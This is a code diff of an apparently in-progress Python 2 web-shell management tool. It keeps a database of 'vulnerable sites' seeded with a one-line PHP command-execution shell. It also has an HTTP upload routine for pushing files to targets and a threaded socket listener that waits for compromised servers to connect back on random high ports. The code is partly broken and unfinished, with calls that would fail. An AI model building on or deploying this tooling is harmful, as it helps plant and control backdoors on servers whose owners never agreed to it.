@@ -5,7 +5,11 @@ import urllib2
 import threading
 import socket
 import shells
+import encoders
 
+
+#variables related to threading
+database_lock = threading.Lock()#serialize access to the database
 
 ###next section is for threading combined with sockets
 class threading_network_listener(threading.Thread):
@@ -16,24 +20,62 @@ class threading_network_listener(threading.Thread):
 	"""
 
 	def __init__(self, port = None):
-		self.port = None#the intended port for the thread to listen on
+		threading.Thread.__init__(self)
+		self.port = port#the intended port for the thread to listen on
 		self.listen_sock = None#the actual socket listening on the port
+		self.message = None
 
-	def create_socket():
+	def create_socket(self):
 		""" Creates a socket for the thread to listen on """
 		listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#create a socket
-		listen_socket.bind("", self.port)#listens on any interface's ip address
-		listen_socket.listen()#actually listen to a port
-		print "socket bound to port "+self.port
+		listen_socket.bind(("", int(self.port)))#listens on any interface's ip address
+		listen_socket.listen(5)#actually listen to a port
+		print "socket bound to port ",self.port
 		return listen_socket
 	
 	def run(self):
-		self.socket = create_socket()
+		self.socket = self.create_socket()
+
+		#we only need to accept once in this scenario.
+		(sock, address) = self.socket.accept()
+
+		#print dir(sock)
+		data = sock.recv(50)
+		if(data == "ok"):
+			global database_name
+			global current_shell_id
+			print str(data)
+
+			#synchronize access to the database
+			database_lock.acquire()
+			conn = sqlite3.connect(database_name)	
+			cursor = conn.cursor()
+			cursor.execute("insert into open_ports(id,port_no) values (?,?)",[(current_shell_id),(self.port)])
+			cursor.commit()
+			database_lock.release()
+
+		#cleanup
+		sock.close()
+		self.socket.close()
+		print "closing socket"
+		##TODO: move over to a curses interface because this print
+		##statement is less than optimal
+
+class threading_http_request(threading.Thread):
+	"""
+		Class that spawns off a thread to perform an http request.
+		Will notify the threading_network_listener thread in the event
+		of an error that the remote server can't connect back.
+	"""
+	def __init__(self):
+		pass
 
 
 database_name = ""
 prompt = "wsmi>"
 directory = ""
+current_shell_id = 0
+
 def print_banner():
 	print "        _       __          __      _    __     __  __"
 	print "       / \\      \\ \\        / /     |  | |     ||  "
@@ -104,10 +146,14 @@ def initialize_database():
 	cursor = conn.cursor()
 
 	#sample data for the time being
-	cursor.execute("create table vulnerable_sites(url text, page text, method text, uploaded_shell text, attackurl text, language text)")
-	cursor.execute("insert into vulnerable_sites(url,page,method,uploaded_shell,attackurl) values(?,?,?,?,?)",\
-		[("www.google.com"),("upload.php"),("POST"),("<?php passthru($_GET['a']); ?>"),("www.google.com/view?id=5")])
-	conn.commit()
+	try:
+		cursor.execute("create table vulnerable_sites(url text,id integer, page text, method text, uploaded_shell text, attackurl text, language text)")
+		cursor.execute("insert into vulnerable_sites(url,page,method,uploaded_shell,attackurl) values(?,?,?,?,?)",\
+			[("www.google.com"),("upload.php"),("POST"),("<?php passthru($_GET['a']); ?>"),("www.google.com/view?id=5")])
+		cursor.execute("create table open_ports(id integer, port_no integer, time text)")
+		conn.commit()
+	except sqlite3.OperationalError as e:
+		print str(e)
 
 def show_shells():
 	"""
@@ -131,24 +177,35 @@ def show_shells():
 def exit():
 	sys.exit(1)
 
-def run_candidate_threads():
+def manage_random_list():
+	"""
+		good candidate for a python generator.
+		Will manage a list of port numbers for scanning candidate shells
+		randomly and not having a repeat in port numbers.
+		will generate port numbers from 1025-65535(non privileged ports)
+	"""
+	port_list = []
+	for i in range(1025,65536):
+		port_list.append(i)
+	dev_urand_file = open('/dev/urandom')
+	rnd_nmb = read(dev_urand_file)
+	print port_list
+
+def run_candidate_threads(thread_count, timing):
 	"""
 
 	"""
+	net_listen = threading_network_listener(65535)
+	net_listen.start()
 	
-
 def check_candidacy():
 	"""
 		script that starts the process of checking a candidacy for a specific 
 		web server.
-
-		
 	"""
 	num_threads = raw_input("number of threads:")
 	timing = raw_input("timing level(0-5):")
-
-
-	
+	run_candidate_threads(num_threads,timing)
 
 def show_contents():
 	global directory
@@ -201,4 +258,5 @@ def http_file_upload(url,filename):
 	data += "Content-Type: application/x-object\r\n\r\n"+file_contents+'\r\n'+boundary+'--\r\n'
 	request = urllib2.Request(url,data,headers)
 
-main()
+#main()
+manage_random_list()
